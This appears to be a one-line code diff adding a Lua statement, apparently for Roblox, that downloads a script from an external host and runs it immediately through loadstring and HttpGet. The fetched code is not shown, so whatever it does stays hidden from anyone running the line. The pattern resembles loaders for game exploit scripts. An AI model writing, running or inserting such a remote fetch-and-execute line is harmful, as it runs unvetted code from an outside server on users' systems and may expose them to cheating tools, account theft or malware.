@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/76a177c1c0a5ce9bcc74bf18870a1f8285841259995989fb1c0cff554c455150.lua"))();
